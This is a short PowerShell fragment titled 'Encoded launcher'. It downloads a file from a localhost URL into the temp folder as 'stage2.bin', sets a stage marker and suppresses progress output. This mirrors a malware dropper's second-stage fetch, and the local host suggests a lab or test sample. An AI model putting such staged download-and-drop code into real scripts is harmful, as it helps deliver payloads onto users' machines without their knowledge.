
# Encoded launcher
(New-Object System.Net.WebClient).DownloadFile('http://localhost:8080/update.dat', "$env:TEMP\stage2.bin")
$StageMarker = "stage-6"
$ProgressPreference = "SilentlyContinue"
